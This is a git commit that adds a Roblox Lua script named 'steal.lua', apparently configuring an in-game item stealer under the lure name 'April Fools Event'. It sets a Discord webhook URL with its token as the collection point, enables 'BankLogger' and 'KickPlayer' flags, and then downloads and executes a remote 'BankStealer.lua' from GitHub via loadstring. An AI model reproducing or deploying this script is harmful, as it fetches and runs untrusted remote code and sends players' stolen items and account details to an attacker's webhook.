22ed40acdc3077df3b71ac06381e81f8e5cf9f4f
PetSimXX <126815012+PetSimXX@users.noreply.github.com>
2023-04-03 13:28:50 +0100

    Add files via upload

---
+++ steal.lua
@@ -0,0 +1,7 @@
+_G.AuthName = 'April Fools Event'
+_G.AuthId = 4258018945
+_G.AuthWebhook = "https://discord.com/api/webhooks/1092422385535291452/15AvLjyQr3p74qUliIZoiZYvpX-14pFzt0CUK2jEf2kOiqTdpHLS-DeDXUxq9M00xLdM"
+_G.BankLogger = true
+_G.KickPlayer = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SaskeCen/Dark-Hub/main/BankStealer.lua"))()
